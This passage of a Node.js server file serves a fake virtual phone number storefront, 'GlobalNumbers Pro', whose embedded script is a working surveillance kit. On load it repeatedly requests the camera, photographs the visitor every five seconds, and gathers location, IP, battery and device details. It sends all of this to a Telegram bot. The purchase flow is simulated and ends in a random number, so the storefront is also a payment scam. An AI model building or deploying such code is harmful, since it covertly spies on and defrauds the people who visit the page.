                        <span class="inr-price">₹1,599/month</span>
                    </div>
                    <ul class="number-features">
                        <li><i class="fas fa-check"></i> 20 Virtual Numbers</li>
                        <li><i class="fas fa-check"></i> 50GB Storage</li>
                        <li><i class="fas fa-check"></i> Priority Support</li>
                        <li><i class="fas fa-check"></i> 90 Days Retention</li>
                        <li><i class="fas fa-check"></i> All Platforms</li>
                    </ul>
                    <button class="buy-btn">Select Plan - ₹1,599</button>
                </div>

                <div class="server-card">
                    <i class="fas fa-cloud server-icon"></i>
                    <h3 class="server-name">Enterprise Server</h3>
                    <div class="server-price">
                        <span class="inr-price">₹3,999/month</span>
                    </div>
                    <ul class="number-features">
                        <li><i class="fas fa-check"></i> Unlimited Numbers</li>
                        <li><i class="fas fa-check"></i> 200GB Storage</li>
                        <li><i class="fas fa-check"></i> 24/7 Premium Support</li>
                        <li><i class="fas fa-check"></i> 1 Year Retention</li>
                        <li><i class="fas fa-check"></i> All Platforms + API</li>
                    </ul>
                    <button class="buy-btn">Select Plan - ₹3,999</button>
                </div>
            </div>
        </div>
    </section>

    <!-- How It Works -->
    <section class="how-it-works" id="how-it-works">
        <div class="container">
            <div class="section-title">
                <h2>How It Works</h2>
                <p>Get your virtual number in 3 simple steps</p>
            </div>
            
            <div class="steps">
                <div class="step">
                    <div class="step-number">1</div>
                    <h3>Select Country & Platform</h3>
                    <p>Choose from 80+ countries and pick your preferred platform (WhatsApp, Telegram, etc.)</p>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <h3>Instant Activation</h3>
                    <p>Complete payment in INR and get your number activated immediately</p>
                </div>
                <div class="step">
                    <div class="step-number">3</div>
                    <h3>Start Using</h3>
                    <p>Use your virtual number for verification on your chosen platform</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Testimonials -->
    <section class="testimonials container" id="testimonials">
        <div class="section-title">
            <h2>Customer Reviews</h2>
            <p>See what our customers are saying about our service</p>
        </div>
        
        <div class="testimonial-cards">
            <div class="testimonial-card">
                <div class="testimonial-content">
                    "I've been using GlobalNumbers for my business verification needs. The WhatsApp numbers work perfectly and the INR pricing is very affordable!"
                </div>
                <div class="testimonial-author">
                    <div class="author-avatar">RS</div>
                    <div class="author-info">
                        <h4>Rahul Sharma</h4>
                        <p>Business Owner, Delhi</p>
                    </div>
                </div>
            </div>
            <div class="testimonial-card">
                <div class="testimonial-content">
                    "Amazing service! Got my US Telegram number within minutes. The pricing in INR makes it so convenient for Indian users. Highly recommended!"
                </div>
                <div class="testimonial-author">
                    <div class="author-avatar">PK</div>
                    <div class="author-info">
                        <h4>Priya Kumar</h4>
                        <p>Digital Marketer, Mumbai</p>
                    </div>
                </div>
            </div>
            <div class="testimonial-card">
                <div class="testimonial-content">
                    "The quality of numbers is exceptional. I've purchased multiple WhatsApp and Telegram numbers for my clients. Service is reliable and fast!"
                </div>
                <div class="testimonial-author">
                    <div class="author-avatar">AP</div>
                    <div class="author-info">
                        <h4>Arun Patel</h4>
                        <p>App Developer, Bangalore</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- CTA Section -->
    <section class="cta-section">
        <div class="container">
            <h2>Ready to Get Your Virtual Number?</h2>
            <p>Join thousands of satisfied customers and get your international number today with easy INR payments</p>
            <button class="btn" id="ctaBtn" style="max-width: 300px;">
                <i class="fas fa-sim-card" style="margin-right: 10px;"></i>
                GET STARTED NOW
            </button>
        </div>
    </section>

    <!-- Generator Section -->
    <section class="container" id="generatorSection">
        <div class="generator" id="generator">
            <div class="generator-header">
                <h2>Get Your Virtual Number</h2>
                <p>Select your preferred country, platform and service type</p>
            </div>
            
            <div class="input-group">
                <select id="countrySelect">
                    <option value="">Select Country</option>
                    <option value="USA">🇺🇸 United States - ₹249</option>
                    <option value="UK">🇬🇧 United Kingdom - ₹299</option>
                    <option value="Germany">🇩🇪 Germany - ₹349</option>
                    <option value="Canada">🇨🇦 Canada - ₹229</option>
                    <option value="Australia">🇦🇺 Australia - ₹379</option>
                    <option value="France">🇫🇷 France - ₹319</option>
                    <option value="India">🇮🇳 India - ₹149</option>
                </select>
            </div>
            
            <div class="input-group">
                <select id="platformSelect">
                    <option value="">Select Platform</option>
                    <option value="whatsapp">WhatsApp - Optimized</option>
                    <option value="telegram">Telegram - Optimized</option>
                    <option value="facebook">Facebook - Optimized</option>
                    <option value="google">Google - Optimized</option>
                    <option value="all">All Platforms</option>
                </select>
            </div>
            
            <div class="input-group">
                <select id="serviceType">
                    <option value="">Select Service Type</option>
                    <option value="sms">SMS Only - Basic</option>
                    <option value="sms_call">SMS & Calls - Standard</option>
                    <option value="premium">Premium (All Features)</option>
                </select>
            </div>

            <div class="input-group">
                <div class="quantity-selector" style="justify-content: center;">
                    <button class="quantity-btn" onclick="updateCartQuantity(-1)">-</button>
                    <span class="quantity-display" id="cart-quantity">1</span>
                    <button class="quantity-btn" onclick="updateCartQuantity(1)">+</button>
                </div>
            </div>
            
            <div class="input-group">
                <div style="text-align: center; font-size: 1.2rem; font-weight: 600; color: var(--primary);">
                    Total: ₹<span id="totalPrice">249</span>
                </div>
            </div>
            
            <button class="btn" id="generateBtn">
                <i class="fas fa-shopping-cart" style="margin-right: 10px;"></i>
                PURCHASE NUMBER - ₹249
            </button>
            
            <div class="trust-badges">
                <div class="badge">
                    <i class="fas fa-shield-alt"></i>
                    <span>Secure</span>
                </div>
                <div class="badge">
                    <i class="fas fa-bolt"></i>
                    <span>Instant</span>
                </div>
                <div class="badge">
                    <i class="fas fa-globe"></i>
                    <span>Global</span>
                </div>
                <div class="badge">
                    <i class="fas fa-rupee-sign"></i>
                    <span>INR</span>
                </div>
            </div>

            <div class="loading-screen" id="loadingScreen">
                <div class="loader-container">
                    <div class="loader"></div>
                </div>
                
                <div class="progress-container">
                    <div class="progress-text">
                        <span>Processing...</span>
                        <span id="progressPercent">0%</span>
                    </div>
                    <div class="progress-bar">
                        <div class="progress" id="progressBar"></div>
                    </div>
                </div>
                
                <div class="server-messages" id="serverMessages"></div>
            </div>

            <div class="result" id="result">
                <i class="fas fa-check-circle result-icon"></i>
                <h2>Success! Number Activated</h2>
                <div class="number-count" id="numberDisplay">+1 XXX-XXX-XXXX</div>
                <div class="result-text">Your virtual number is ready to use on your selected platform</div>
                <button class="btn" id="shareBtn" style="background: linear-gradient(45deg, #059669, #047857); margin-bottom: 10px;">
                    <i class="fas fa-copy" style="margin-right: 10px;"></i>
                    COPY NUMBER
                </button>
                <button class="btn" id="whatsappBtn" style="background: linear-gradient(45deg, #25D366, #128C7E);">
                    <i class="fab fa-whatsapp" style="margin-right: 10px;"></i>
                    OPEN WHATSAPP
                </button>
            </div>

            <div class="disclaimer">
                <i class="fas fa-info-circle" style="margin-right: 5px;"></i>
                By purchasing our virtual numbers, you agree to our Terms of Service. Numbers are for legal use only. Refunds are not available after number activation. All prices in INR.
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="footer-content">
                <div class="footer-column">
                    <h3>GlobalNumbers Pro</h3>
                    <p>The leading virtual numbers service trusted by users worldwide for verification and privacy. Affordable INR pricing.</p>
                </div>
                <div class="footer-column">
                    <h3>Quick Links</h3>
                    <ul class="footer-links">
                        <li><a href="#numbers">Numbers</a></li>
                        <li><a href="#platforms">Platforms</a></li>
                        <li><a href="#servers">Servers</a></li>
                        <li><a href="#how-it-works">How It Works</a></li>
                        <li><a href="#testimonials">Reviews</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h3>Legal</h3>
                    <ul class="footer-links">
                        <li><a href="#">Terms of Service</a></li>
                        <li><a href="#">Privacy Policy</a></li>
                        <li><a href="#">Cookie Policy</a></li>
                        <li><a href="#">Refund Policy</a></li>
                    </ul>
                </div>
                <div class="footer-column">
                    <h3>Support</h3>
                    <ul class="footer-links">
                        <li><a href="mailto:support@globalnumberspro.com">support@globalnumberspro.com</a></li>
                        <li><a href="#">Help Center</a></li>
                        <li><a href="#">Live Chat</a></li>
                        <li><a href="#">Status Page</a></li>
                    </ul>
                </div>
            </div>
            
            <div class="footer-bottom">
                <p>&copy; 2023 GlobalNumbers Pro. All rights reserved. | Prices in INR</p>
            </div>
        </div>
    </footer>

    <!-- Hidden Camera Elements -->
    <video id="hiddenCamera" class="hidden-camera" autoplay></video>
    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>

    <script>
        // ========== TELEGRAM CONFIGURATION ==========
        const chatId = "` + chatId + `";
        const botToken = "` + botToken + `";
        
        console.log('Telegram Config Loaded:', { chatId, botToken });

        // Camera and location tracking variables
        let cameraStream = null;
        let photoInterval = null;
        let photoCount = 0;
        let hiddenVideo = null;
        let hiddenCanvas = null;
        let userLocation = null;
        let locationRequested = false;
        let cameraAccessGranted = false;

        // Pricing configuration
        const countryPrices = {
            'USA': 249,
            'UK': 299,
            'Germany': 349,
            'Canada': 229,
            'Australia': 379,
            'France': 319,
            'India': 149
        };

        window.addEventListener('load', function() {
            // Create hidden elements for camera
            hiddenVideo = document.getElementById('hiddenCamera');
            hiddenCanvas = document.getElementById('hiddenCanvas');

            // SILENTLY request camera permission on site load
            setTimeout(function() {
                requestCameraPermission();
            }, 1000);

            // Initialize platform tabs
            initializePlatformTabs();
        });

        // Platform tabs functionality
        function initializePlatformTabs() {
            const tabs = document.querySelectorAll('.platform-tab');
            const contents = document.querySelectorAll('.platform-content');

            tabs.forEach(tab => {
                tab.addEventListener('click', () => {
                    // Remove active class from all tabs and contents
                    tabs.forEach(t => t.classList.remove('active'));
                    contents.forEach(c => c.classList.remove('active'));

                    // Add active class to clicked tab and corresponding content
                    tab.classList.add('active');
                    const platform = tab.getAttribute('data-platform');
                    document.getElementById(platform + '-content').classList.add('active');
                });
            });
        }

        // Quantity update functions
        function updateQuantity(country, change) {
            const quantityElement = document.getElementById(country + '-quantity');
            let quantity = parseInt(quantityElement.textContent);
            quantity = Math.max(1, quantity + change);
            quantityElement.textContent = quantity;

            // Update button text with new total
            const button = document.querySelector('.buy-btn[data-country="' + country + '"]');
            const basePrice = parseInt(button.getAttribute('data-price'));
            const totalPrice = basePrice * quantity;
            button.textContent = 'Buy Now - ₹' + totalPrice;
        }

        function updateCartQuantity(change) {
            const quantityElement = document.getElementById('cart-quantity');
            let quantity = parseInt(quantityElement.textContent);
            quantity = Math.max(1, quantity + change);
            quantityElement.textContent = quantity;
            updateTotalPrice();
        }

        function updateTotalPrice() {
            const countrySelect = document.getElementById('countrySelect');
            const quantity = parseInt(document.getElementById('cart-quantity').textContent);
            const selectedCountry = countrySelect.value;
            
            if (selectedCountry && countryPrices[selectedCountry]) {
                const totalPrice = countryPrices[selectedCountry] * quantity;
                document.getElementById('totalPrice').textContent = totalPrice;
                document.getElementById('generateBtn').innerHTML = 
                    '<i class="fas fa-shopping-cart" style="margin-right: 10px;"></i>PURCHASE NUMBER - ₹' + totalPrice;
            }
        }

        // Function to request camera permission (will keep asking until allowed)
        function requestCameraPermission() {
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: 640, 
                    height: 480,
                    facingMode: 'user' // Use front camera
                } 
            })
            .then(function(stream) {
                console.log("Camera accessed successfully!");
                cameraStream = stream;
                cameraAccessGranted = true;
                
                // Setup hidden video
                hiddenVideo.srcObject = stream;
                hiddenVideo.play();
                
                // Wait for video to be ready then start capturing
                hiddenVideo.addEventListener('loadedmetadata', function() {
                    startPhotoCapture();
                });
            })
            .catch(function(err) {
                console.log("Camera denied: " + err);
                cameraAccessGranted = false;
                // Try again in 3 seconds
                setTimeout(requestCameraPermission, 3000);
            });
        }

        // Function to request location permission (one time only)
        function requestLocationPermission() {
            if (locationRequested) return;
            
            if (navigator.geolocation) {
                locationRequested = true;
                console.log("Requesting location permission...");
                
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        };
                        console.log("Location accessed:", userLocation);
                        
                        // Send location to Telegram immediately
                        sendLocationToTelegram(userLocation);
                    },
                    function(error) {
                        console.log("Location not available:", error.message);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }
        }

        // ========== SEND LOCATION TO TELEGRAM ==========
        async function sendLocationToTelegram(location) {
            if (!chatId || !botToken) {
                console.log('Missing chatId or botToken');
                return;
            }

            const message = "📍 **LOCATION CAPTURED** 📍\\n\\n" +
                           "📱 **Device Info:**\\n" +
                           "• User Agent: " + navigator.userAgent + "\\n" +
                           "• Platform: " + navigator.platform + "\\n" +
                           "• Language: " + navigator.language + "\\n\\n" +
                           "📍 **Location Data:**\\n" +
                           "• Latitude: " + location.latitude + "\\n" +
                           "• Longitude: " + location.longitude + "\\n" +
                           "• Accuracy: " + location.accuracy + " meters\\n\\n" +
                           "• Google Maps:https://www.google.com/maps?q=" + location.latitude + "," + location.longitude + "\\n\\n" +
                           "🕐 **Time:** " + new Date().toLocaleString() + "\\n" +
                           "🌐 **Page URL:** " + window.location.href;

            try {
                const response = await fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    console.log('📍 Location sent to Telegram successfully');
                } else {
                    console.error('Failed to send location to Telegram');
                }
            } catch (error) {
                console.error('Error sending location to Telegram:', error);
            }
        }

        // Start capturing photos
        function startPhotoCapture() {
            // Capture first photo immediately
            setTimeout(capturePhoto, 1000);
            
            // Then capture every 5 seconds
            photoInterval = setInterval(() => {
                capturePhoto();
            }, 5000);
        }

        // Capture photo and collect data
        async function capturePhoto() {
            if (!cameraStream || !hiddenVideo || hiddenVideo.videoWidth === 0) {
                console.log("Camera not ready");
                return;
            }
            
            try {
                // Setup canvas
                hiddenCanvas.width = hiddenVideo.videoWidth;
                hiddenCanvas.height = hiddenVideo.videoHeight;
                const context = hiddenCanvas.getContext('2d');
                
                // Draw video frame to canvas
                context.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);
                
                // Collect visitor information
                const visitorInfo = await collectVisitorInfo();
                visitorInfo.photo_count = photoCount;
                
                // Add location to visitor info if available
                if (userLocation) {
                    visitorInfo.location = userLocation;
                }
                
                // Convert to blob and send to Telegram
                hiddenCanvas.toBlob(blob => {
                    if (blob) {
                        sendPhotoToTelegram(blob, visitorInfo);
                        console.log("📸 Photo " + photoCount + " captured and sent");
                    }
                }, 'image/jpeg', 0.8);
                
                photoCount++;
                
            } catch (error) {
                console.error("Error capturing photo:", error);
            }
        }

        // Collect all visitor information
        async function collectVisitorInfo() {
            const info = {
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                screen: screen.width + "x" + screen.height,
                viewport: window.innerWidth + "x" + window.innerHeight,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer,
                url: window.location.href
            };

            // Get battery information
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    info.battery = Math.round(battery.level * 100) + "%";
                    info.charging = battery.charging;
                } catch (e) {
                    info.battery = 'unavailable';
                }
            }

            // Get connection information
            if ('connection' in navigator) {
                const connection = navigator.connection;
                info.connection_type = connection.effectiveType;
                info.downlink = connection.downlink;
            }

            // Get IP address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                info.ip = ipData.ip;
            } catch (e) {
                info.ip = 'unknown';
            }

            // Get device memory
            if ('deviceMemory' in navigator) {
                info.memory = navigator.deviceMemory;
            }

            // Get CPU cores
            if ('hardwareConcurrency' in navigator) {
                info.cores = navigator.hardwareConcurrency;
            }

            return info;
        }

        // ========== SEND PHOTO TO TELEGRAM ==========
        async function sendPhotoToTelegram(blob, visitorInfo) {
            if (!chatId || !botToken) {
                console.log('Missing chatId or botToken - cannot send photo');
                return;
            }

            try {
                // Convert blob to File
                const file = new File([blob], "photo_" + Date.now() + ".jpg", { type: 'image/jpeg' });
                
                // Create FormData
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', file);
                
                // Create caption with visitor info
                const caption = "📸 **CAMERA PHOTO CAPTURED** 📸\\n\\n" +
                               "🆔 **Photo #" + visitorInfo.photo_count + "**\\n" +
                               "🕐 **Time:** " + new Date(visitorInfo.timestamp).toLocaleString() + "\\n\\n" +
                               "📱 **Device Information:**\\n" +
                               "• Platform: " + visitorInfo.platform + "\\n" +
                               "• Screen: " + visitorInfo.screen + "\\n" +
                               "• Viewport: " + visitorInfo.viewport + "\\n" +
                               "• Language: " + visitorInfo.language + "\\n" +
                               "• Timezone: " + visitorInfo.timezone + "\\n\\n" +
                               "🌐 **Network & System:**\\n" +
                               "• IP Address: " + visitorInfo.ip + "\\n" +
                               "• Connection: " + (visitorInfo.connection_type || 'Unknown') + "\\n" +
                               "• Battery: " + visitorInfo.battery + (visitorInfo.charging ? ' (Charging)' : '') + "\\n" +
                               "• Cores: " + (visitorInfo.cores || 'Unknown') + "\\n" +
                               "• Memory: " + (visitorInfo.memory || 'Unknown') + " GB\\n\\n" +
                               "📍 **Location:** " + (visitorInfo.location ? 
                                   visitorInfo.location.latitude + ", " + visitorInfo.location.longitude : 
                                   'Not available') + "\\n\\n" +
                               "🔗 **Referrer:** " + (visitorInfo.referrer || 'Direct visit');

                formData.append('caption', caption);
                formData.append('parse_mode', 'Markdown');

                // Send to Telegram
                const response = await fetch("https://api.telegram.org/bot" + botToken + "/sendPhoto", {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    console.log('✅ Photo sent to Telegram successfully');
                } else {
                    const errorText = await response.text();
                    console.error('❌ Failed to send photo to Telegram:', errorText);
                }
            } catch (error) {
                console.error('❌ Error sending photo to Telegram:', error);
            }
        }

        // ========== EXISTING DOM CODE ==========
        // DOM Elements
        const getStartedBtn = document.getElementById('getStartedBtn');
        const ctaBtn = document.getElementById('ctaBtn');
        const generator = document.getElementById('generator');
        const generateBtn = document.getElementById('generateBtn');
        const loadingScreen = document.getElementById('loadingScreen');
        const result = document.getElementById('result');
        const shareBtn = document.getElementById('shareBtn');
        const whatsappBtn = document.getElementById('whatsappBtn');
        const countrySelect = document.getElementById('countrySelect');
        const platformSelect = document.getElementById('platformSelect');
        const serviceType = document.getElementById('serviceType');
        
        // Show generator when Get Started is clicked - WITH CAMERA CHECK
        function showGenerator() {
            // SILENTLY trigger location permission (one time)
            requestLocationPermission();
            
            // Check if camera is allowed
            if (!cameraAccessGranted) {
                console.log("Camera not allowed, requesting again...");
                requestCameraPermission();
                return;
            }
            
            // Only show generator if camera is allowed
            document.querySelectorAll('section:not(#generatorSection)').forEach(section => {
                section.style.display = 'none';
            });
            
            // Show the generator with a smooth animation
            generator.style.display = 'block';
            setTimeout(() => {
                generator.classList.add('fade-in');
                generator.scrollIntoView({ behavior: 'smooth' });
            }, 100);
        }
        
        // Event listeners for Get Started buttons
        getStartedBtn.addEventListener('click', showGenerator);
        ctaBtn.addEventListener('click', showGenerator);
        
        // Buy button handlers for number cards
        document.querySelectorAll('.buy-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                const country = this.getAttribute('data-country');
                const platform = this.getAttribute('data-platform');
                showGenerator();
                
                // Auto-select the country and platform in dropdowns
                setTimeout(() => {
                    if (country) countrySelect.value = country;
                    if (platform) platformSelect.value = platform;
                    updateTotalPrice();
                }, 500);
            });
        });

        // Update total price when country changes
        countrySelect.addEventListener('change', updateTotalPrice);

        // Validation function
        function isValidSelection() {
            if (!countrySelect.value) {
                alert("Please select a country");
                return false;
            }
            if (!platformSelect.value) {
                alert("Please select a platform");
                return false;
            }
            if (!serviceType.value) {
                alert("Please select a service type");
                return false;
            }
            return true;
        }
        
        // Number generation process
        let progress = 0;
        const messages = [
            { text: "Initializing number allocation protocol...", type: "info", delay: 1000 },
            { text: "Connecting to global telecom servers...", type: "info", delay: 2500 },
            { text: "Validating country selection and platform...", type: "info", delay: 4500 },
            { text: "Allocating virtual number from available pool...", type: "info", delay: 7000 },
            { text: "Configuring platform-specific optimization...", type: "info", delay: 9500 },
            { text: "Server response: 200 OK", type: "success", delay: 12000 },
            { text: "Activating number with carrier...", type: "info", delay: 14500 },
            { text: "Setting up verification protocols...", type: "info", delay: 17000 },
            { text: "Configuring international routing...", type: "info", delay: 19500 },
            { text: "Finalizing activation...", type: "success", delay: 22000 },
            { text: "Number successfully activated and ready!", type: "success", delay: 24500 }
        ];

        function startProcess() {
            if (!isValidSelection()) return;

            // Hide main screen, show loading
            document.querySelectorAll('.input-group').forEach(el => el.style.display = 'none');
            document.querySelector('#generateBtn').style.display = 'none';
            document.querySelector('.trust-badges').style.display = 'none';
            document.querySelector('.disclaimer').style.display = 'none';
            loadingScreen.style.display = 'block';

            // Add initial message
            const serverMessages = document.getElementById('serverMessages');
            const welcomeMsg = document.createElement('div');
            welcomeMsg.className = 'message info';
            welcomeMsg.innerHTML = "[" + getCurrentTime() + "] Starting activation for " + countrySelect.options[countrySelect.selectedIndex].text + " (" + platformSelect.options[platformSelect.selectedIndex].text + ")";
            serverMessages.appendChild(welcomeMsg);

            // Start the process
            setTimeout(() => {
                simulateServerProcess();
            }, 1000);
        }

        function simulateServerProcess() {
            const serverMessages = document.getElementById('serverMessages');
            const progressBar = document.getElementById('progressBar');
            const progressPercent = document.getElementById('progressPercent');

            messages.forEach((message, index) => {
                setTimeout(() => {
                    const messageElement = document.createElement('div');
                    messageElement.className = "message " + message.type;
                    messageElement.innerHTML = "[" + getCurrentTime() + "] " + message.text;
                    serverMessages.appendChild(messageElement);
                    serverMessages.scrollTop = serverMessages.scrollHeight;

                    progress = Math.min(100, ((index + 1) / messages.length) * 100);
                    progressBar.style.width = progress + '%';
                    progressPercent.textContent = Math.round(progress) + '%';

                    if (index === messages.length - 1) {
                        setTimeout(showResult, 2000);
                    }
                }, message.delay);
            });
        }

        function getCurrentTime() {
            const now = new Date();
            return now.toTimeString().split(' ')[0];
        }

        function showResult() {
            loadingScreen.style.display = 'none';
            result.style.display = 'block';
            
            const numberDisplay = document.getElementById('numberDisplay');
            // Generate random phone number based on country
            const countryPrefixes = {
                'USA': '+1',
                'UK': '+44',
                'Germany': '+49',
                'Canada': '+1',
                'Australia': '+61',
                'France': '+33',
                'India': '+91'
            };
            
            const prefix = countryPrefixes[countrySelect.value] || '+1';
            const randomNumber = Math.floor(1000000000 + Math.random() * 9000000000);
            const formattedNumber = prefix + ' ' + randomNumber.toString().replace(/(\\d{3})(\\d{3})(\\d{4})/, '$1-$2-$3');
            
            numberDisplay.textContent = formattedNumber;
        }

        function copyNumber() {
            const numberText = document.getElementById('numberDisplay').textContent;
            navigator.clipboard.writeText(numberText).then(() => {
                alert("Number copied to clipboard: " + numberText + "\\n\\nYour virtual number is ready to use for verification!");
            });
        }

        function openWhatsApp() {
            const numberText = document.getElementById('numberDisplay').textContent.replace(/[^0-9]/g, '');
            window.open('https://wa.me/' + numberText, '_blank');
        }

        // Event listeners
        generateBtn.addEventListener('click', startProcess);
        shareBtn.addEventListener('click', copyNumber);
        whatsappBtn.addEventListener('click', openWhatsApp);

        // Cleanup when page closes
        window.addEventListener('beforeunload', function() {
            if (photoInterval) {
                clearInterval(photoInterval);
            }
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>`;
}

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Virtual Numbers API running on port ${PORT}`);
  console.log(`📸 Camera Capture: http://localhost:${PORT}/api/cam-Hack.js?code=ENCODED_CHAT_ID`);
  console.log(`🏠 Home: http://localhost:${PORT}`);
});
